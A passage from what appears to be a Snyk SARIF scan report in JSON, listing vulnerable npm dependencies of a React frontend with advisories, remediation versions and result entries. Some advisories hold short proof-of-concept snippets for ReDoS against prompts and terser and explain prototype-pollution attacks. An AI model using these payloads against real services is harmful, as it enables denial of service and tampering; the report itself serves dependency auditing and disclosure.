an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `nth-check` to version 2.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1333",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-NWSAPI-2841516",
              "shortDescription": {
                "text": "Medium severity - Denial of Service (DoS) vulnerability in nwsapi"
              },
              "fullDescription": {
                "text": "nwsapi@2.2.0"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: nwsapi\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › jest@27.4.7 › @jest/core@27.4.7 › jest-config@27.4.7 › jest-environment-jsdom@27.4.6 › jsdom@16.7.0 › nwsapi@2.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when it is provided the invalid selector `_:-ms-fullscreen`. This triggers an infinite loop.\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n# Remediation\nUpgrade `nwsapi` to version 2.2.1 or higher.\n# References\n- [GitHub Commit](https://github.com/dperini/nwsapi/commit/ab9cde1eb05ec9badfc3abaf15687b1a6f9e9ad3)\n- [GitHub Issue](https://github.com/dperini/nwsapi/issues/46#issuecomment-1134223659)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-PROMPTS-1729737",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in prompts"
              },
              "fullDescription": {
                "text": "(CVE-2021-3868) prompts@2.4.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: prompts\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › jest@27.4.7 › jest-cli@27.4.7 › prompts@2.4.1\n# Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker that is able to provide a crafted input to the strip functionality may cause an application to consume an excessive amount of CPU.\r\n\r\n## PoC\r\n```\r\nconst strip = require('prompts/lib/util/strip.js');\r\nfor(var i = 1; i <= 5000; i++) {\r\nvar time = Date.now();\r\nvar attack_str = \"\\u001B[\"+\";\".repeat(i*1000);\r\nstrip(attack_str)\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `prompts` to version 2.4.2 or higher.\n# References\n- [GitHub PR](https://github.com/terkelg/prompts/pull/333)\n- [GitHub Release](https://github.com/terkelg/prompts/releases/tag/v2.4.2)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1333",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-TERSER-2806366",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in terser"
              },
              "fullDescription": {
                "text": "(CVE-2022-25858) terser@5.10.0"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: terser\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › terser-webpack-plugin@5.3.0 › terser@5.10.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › html-webpack-plugin@5.5.0 › html-minifier-terser@6.1.0 › terser@5.10.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › workbox-webpack-plugin@6.4.2 › workbox-build@6.4.2 › rollup-plugin-terser@7.0.2 › terser@5.10.0\n# Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.\r\n\r\n# PoC:\r\n```js\r\necho 'console.log(/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\"))' | npx terser -mc unsafe=true\r\n```\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `terser` to version 4.8.1, 5.14.2 or higher.\n# References\n- [GitHub Commit](https://github.com/terser/terser/commit/a4da7349fdc92c05094f41d33d06d8cd4e90e76b)\n- [GitHub Commit](https://github.com/terser/terser/commit/d8cc5691be980d663c29cc4d5ce67e852d597012)\n- [Vulnerable Code](https://github.com/terser/terser/blob/master/lib/compress/evaluate.js#L135)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1333",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-UGLIFYJS-1727251",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in uglify-js"
              },
              "fullDescription": {
                "text": "uglify-js@2.7.5"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: uglify-js\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › uglify-js@2.7.5\n# Overview\n[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `uglify-js` to version 3.14.3 or higher.\n# References\n- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)\n- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1333",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-UNSETVALUE-2400660",
              "shortDescription": {
                "text": "High severity - Prototype Pollution vulnerability in unset-value"
              },
              "fullDescription": {
                "text": "unset-value@1.0.0"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: unset-value\n* Introduced through: spyros-frontend@1.0.0, awesome-typescript-loader@5.2.1 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › awesome-typescript-loader@5.2.1 › micromatch@3.1.10 › braces@2.3.2 › snapdragon@0.8.2 › base@0.11.2 › cache-base@1.0.1 › unset-value@1.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › watchpack@0.2.9 › chokidar@1.7.0 › readdirp@2.2.1 › micromatch@3.1.10 › braces@2.3.2 › snapdragon@0.8.2 › base@0.11.2 › cache-base@1.0.1 › unset-value@1.0.0\n# Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.\n\n# Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n## Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n## Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n# Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n# Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n# How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n## For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n# Remediation\nUpgrade `unset-value` to version 2.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)\n- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)\n- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)\n- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1321",
                  "yarn"
                ]
              }
            },
            {
              "id": "npm:braces:20180219",
              "shortDescription": {
                "text": "Low severity - Regular Expression Denial of Service (ReDoS) vulnerability in braces"
              },
              "fullDescription": {
                "text": "(CVE-2018-1109) braces@1.8.5"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: braces\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › watchpack@0.2.9 › chokidar@1.7.0 › anymatch@1.3.2 › micromatch@2.3.11 › braces@1.8.5\n# Overview\n[braces](https://www.npmjs.com/package/braces) is a Bash-like brace expansion, implemented in JavaScript.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`^\\{(,+(?:(\\{,+\\})*),*|,*(?:(\\{,+\\})*),+)\\}`) in order to detects empty braces. This can cause an impact of about 10 seconds matching time for data 50K characters long.\r\n\r\n# Disclosure Timeline\r\n* Feb 15th, 2018 - Initial Disclosure to package owner\r\n* Feb 16th, 2018 - Initial Response from package owner\r\n* Feb 18th, 2018 - Fix issued\r\n* Feb 19th, 2018 - Vulnerability published\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `braces` to version 2.3.1 or higher.\n# References\n- [GitHub Commit](https://github.com/micromatch/braces/commit/abdafb0cae1e0c00f184abbadc692f4eaa98f451)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-185",
                  "CWE-400",
                  "yarn"
                ]
              }
            }
          ]
        }
      },
      "results": [
        {
          "ruleId": "SNYK-JS-ANSIREGEX-1583908",
          "level": "error",
          "message": {
            "text": "This file introduces a vulnerable ansi-regex package with a high severity vulnerability."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "package.json"
                },
                "region": {
                  "startLine": 1
                }
              }
            }
          ]
        },
        {
          "ruleId": "SNYK-JS-ASYNC-2441827",
          "level": "error",
          "message": {
            "text": "This file introduces a vulnerable async package with a high severity vulnerability."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "package.json"
                },
                "region": {
                  "startLine": 1
                }
              }
            }
          ]
        },
        {
          "ruleId": "SNYK-JS-CSSWHAT-1298035",
          "level": "warning",
          "message": {
            "text": "This file introduces a vulnerable css-what package with a medium severity vulnerability."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "package.json"
                },
                "region": {
                  "startLine": 1
                }
              }
            }
          ]
        },
        {
          "ruleId": "SNYK-JS-D3COLOR-1076592",
          "level": "warning",
          "message": {
            "text": "This file introduces a vulnerable d3-color package with a medium severity vulnerability."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "package.json"
                },
                "region": {
                  "startLine": 1
                }
              }
            }
          ]
        },
        {
          "ruleId": "SNYK-JS-EJS-2803307",
          "level": "error",
          "message": {
            "text": "This file introduces a vulnerable ejs package with a high severity vulnerability."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "package.json"
                },
                "region": {
                  "startLine": 1
                }
              }
            }
          ]
        }
        
      ]
    }
  ]
}
